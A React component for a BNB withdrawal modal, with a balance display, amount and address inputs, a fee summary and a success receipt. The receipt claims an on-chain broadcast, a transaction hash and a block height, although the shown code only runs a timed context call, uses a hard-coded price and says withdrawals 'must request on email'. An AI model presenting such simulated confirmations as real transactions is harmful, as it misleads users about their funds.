import React, { useState } from 'react';
import { 
  X, 
  ArrowUpRight, 
  CheckCircle2, 
  Mail, 
  ShieldCheck, 
  AlertCircle,
  Coins
} from 'lucide-react';
import { useProtocol } from '../context/ProtocolContext';
import { CONTRACTS, formatUSD, shortenAddress } from '../data/constants';

interface WithdrawalModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClose }) => {
  const { wallet, processWithdrawalBnb, rechargeBalance } = useProtocol();

  const [withdrawBnbAmount, setWithdrawBnbAmount] = useState<string>('0.5');
  const [recipientAddress, setRecipientAddress] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [receipt, setReceipt] = useState<any | null>(null);

  if (!isOpen) return null;

  const bnbPrice = 614.50;
  const gasFeeBnb = 0.00045;
  const availableBnb = rechargeBalance + wallet.balances.BNB;

  const handlePercentage = (pct: number) => {
    const calculated = (availableBnb * (pct / 100)).toFixed(4);
    setWithdrawBnbAmount(calculated);
    setErrorMsg(null);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const amount = parseFloat(withdrawBnbAmount);
    if (isNaN(amount) || amount <= 0) {
      setErrorMsg('Please enter a valid withdrawal amount.');
      return;
    }
    if (amount > availableBnb) {
      setErrorMsg(`Insufficient BNB balance. Max available: ${availableBnb.toFixed(4)} BNB`);
      return;
    }
    if (!recipientAddress || recipientAddress.trim().length < 10) {
      setErrorMsg('Please enter a valid BEP-20 destination address starting with 0x.');
      return;
    }

    setIsSubmitting(true);
    setErrorMsg(null);

    setTimeout(() => {
      const res = processWithdrawalBnb(
        amount, 
        recipientAddress.trim(),
        `BNB Withdrawal of ${amount.toFixed(4)} BNB ($${(amount * bnbPrice).toFixed(2)}) processed`
      );

      if (res.success && res.alert) {
        setReceipt(res.alert);
      } else {
        setErrorMsg(res.message);
      }
      setIsSubmitting(false);
    }, 600);
  };

  const handleResetAndClose = () => {
    setReceipt(null);
    setErrorMsg(null);
    onClose();
  };

  const numAmount = parseFloat(withdrawBnbAmount) || 0;
  const netReceived = Math.max(0, numAmount - gasFeeBnb);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-zinc-900 border border-zinc-800 rounded-3xl p-6 shadow-2xl space-y-5">
        {/* Header */}
        <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-400 to-teal-500 text-zinc-950 font-black flex items-center justify-center shadow-lg shadow-emerald-500/20">
              <ArrowUpRight className="w-5 h-5" />
            </div>
            <div>
              <h3 className="font-bold text-white text-base">Withdrawal Crypto (BNB)</h3>
              <p className="text-xs text-zinc-400 font-mono">Network: BNB Smart Chain (BEP-20)</p>
            </div>
          </div>
          <button
            onClick={handleResetAndClose}
            className="p-1 rounded-lg text-zinc-400 hover:text-white hover:bg-zinc-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {receipt ? (
          /* Success Receipt */
          <div className="space-y-4 text-xs animate-in zoom-in-95 duration-200">
            <div className="p-4 rounded-2xl bg-emerald-950/70 border border-emerald-700/60 text-center space-y-2">
              <div className="w-12 h-12 mx-auto rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 flex items-center justify-center">
                <CheckCircle2 className="w-7 h-7" />
              </div>
              <h4 className="text-base font-bold text-white">Withdrawal Broadcasted & Alert Dispatched!</h4>
              <p className="text-emerald-300 font-sans text-xs">
                Your withdrawal of <span className="font-bold">{receipt.amountBnb.toFixed(4)} BNB</span> ({formatUSD(receipt.amountUsd)}) was broadcasted to the BNB Smart Chain network.
              </p>
            </div>

            <div className="p-4 rounded-2xl bg-zinc-950 border border-zinc-800 space-y-2 font-mono text-[11px]">
              <div className="flex justify-between py-1 border-b border-zinc-850">
                <span className="text-zinc-500">Destination Address:</span>
                <span className="text-zinc-200">{shortenAddress(receipt.walletAddress)}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-zinc-850">
                <span className="text-zinc-500">Tx Hash:</span>
                <span className="text-zinc-200 truncate max-w-[220px]">{receipt.txHash}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-zinc-850">
                <span className="text-zinc-500">Block Height:</span>
                <span className="text-amber-400">#{receipt.blockNumber}</span>
              </div>
              <div className="flex justify-between py-1 pt-1.5 text-amber-400 font-bold">
                <span className="flex items-center gap-1 font-sans">
                  <Mail className="w-3.5 h-3.5" />
                  Alert Dispatched To:
                </span>
                <span>{receipt.recipientEmail}</span>
              </div>
            </div>

            <button
              onClick={handleResetAndClose}
              className="w-full py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 text-zinc-950 font-bold text-xs shadow-lg hover:brightness-110 transition-all"
            >
              Done & Return
            </button>
          </div>
        ) : (
          /* Withdrawal Form */
          <form onSubmit={handleSubmit} className="space-y-4 text-xs">
            {errorMsg && (
              <div className="p-3 rounded-xl bg-rose-950/80 border border-rose-800 text-rose-300 flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Available Balance Box */}
            <div className="p-3.5 rounded-2xl bg-zinc-950 border border-zinc-800 flex items-center justify-between">
              <div>
                <span className="text-zinc-500 text-[11px] block">Available Wallet Balance</span>
                <span className="text-base font-bold text-white font-mono">
                  {availableBnb.toFixed(4)} BNB
                </span>
                <span className="text-xs text-zinc-400 font-mono ml-2">
                  (≈ {formatUSD(availableBnb * bnbPrice)})
                </span>
              </div>
              <button
                type="button"
                onClick={() => handlePercentage(100)}
                className="px-2.5 py-1 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-amber-400 font-mono text-xs font-bold"
              >
                Max
              </button>
            </div>

            {/* Amount input */}
            <div className="p-3.5 rounded-2xl bg-zinc-950 border border-zinc-800">
              <div className="flex justify-between text-zinc-400 mb-1">
                <span>Amount to Withdraw</span>
                <span className="font-mono text-amber-400 font-semibold">
                  ≈ {formatUSD(numAmount * bnbPrice)}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <input
                  type="number"
                  step="0.0001"
                  min="0.001"
                  max={availableBnb}
                  value={withdrawBnbAmount}
                  onChange={(e) => setWithdrawBnbAmount(e.target.value)}
                  className="bg-transparent text-2xl font-bold text-white focus:outline-none w-2/3 font-mono"
                  placeholder="0.00"
                  required
                />
                <span className="px-3 py-1.5 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-400 font-bold font-mono">
                  BNB
                </span>
              </div>

              {/* Quick % chips */}
              <div className="grid grid-cols-4 gap-1.5 mt-3 pt-3 border-t border-zinc-850">
                {[25, 50, 75, 100].map((pct) => (
                  <button
                    key={pct}
                    type="button"
                    onClick={() => handlePercentage(pct)}
                    className="py-1 rounded-lg bg-zinc-900 border border-zinc-800 hover:border-zinc-700 text-zinc-300 font-mono text-[11px] font-semibold"
                  >
                    {pct}%
                  </button>
                ))}
              </div>
            </div>

            {/* Destination Address Input */}
            <div>
              <label className="block text-zinc-300 font-semibold mb-1">
                Destination BNB (BEP-20) Wallet Address
              </label>
              <input
                type="text"
                value={recipientAddress}
                onChange={(e) => setRecipientAddress(e.target.value)}
                placeholder="0x..."
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-xs text-zinc-200 font-mono placeholder-zinc-600 focus:outline-none focus:border-emerald-500/50"
                required
              />
              <span className="text-[11px] text-zinc-500 mt-1 block">
                Ensure destination is a BEP-20 compatible wallet (MetaMask, Binance Wallet, Trust Wallet).
              </span>
            </div>

            {/* Fee summary */}
            <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] font-mono space-y-1.5 text-zinc-400">
              <div className="flex justify-between">
                <span>Network Execution Fee:</span>
                <span className="text-zinc-300">~0.00045 BNB (~$0.28)</span>
              </div>
              <div className="flex justify-between border-t border-zinc-850 pt-1 text-emerald-400 font-bold">
                <span>Estimated Net to Receive:</span>
                <span>{netReceived.toFixed(4)} BNB ({formatUSD(netReceived * bnbPrice)})</span>
              </div>
            </div>

            {/* Instant Alert Banner */}
            <div className="p-3.5 rounded-2xl bg-emerald-500/10 border border-emerald-500/25 text-[11px] text-emerald-300 flex items-start gap-2.5">
              <Mail className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
              <div>
                <span className="font-bold">Official Withdrawal Email Verification Request:</span>
                <p className="text-zinc-300 mt-0.5 leading-relaxed">
                  Only withdrawals must request on email: <span className="text-white font-mono font-bold">{CONTRACTS.ALERT_EMAIL}</span>. An immediate verification dispatch request will be transmitted to this official email address upon broadcast.
                </p>
              </div>
            </div>

            {/* Submit */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 hover:from-emerald-400 hover:to-teal-400 text-zinc-950 font-black text-xs uppercase tracking-wider shadow-lg shadow-emerald-500/20 transition-all flex items-center justify-center gap-2"
            >
              <ArrowUpRight className="w-4 h-4" />
              <span>{isSubmitting ? 'Processing Network Broadcast...' : `Authorize Withdrawal of ${numAmount.toFixed(4)} BNB`}</span>
            </button>
          </form>
        )}
      </div>
    </div>
  );
};
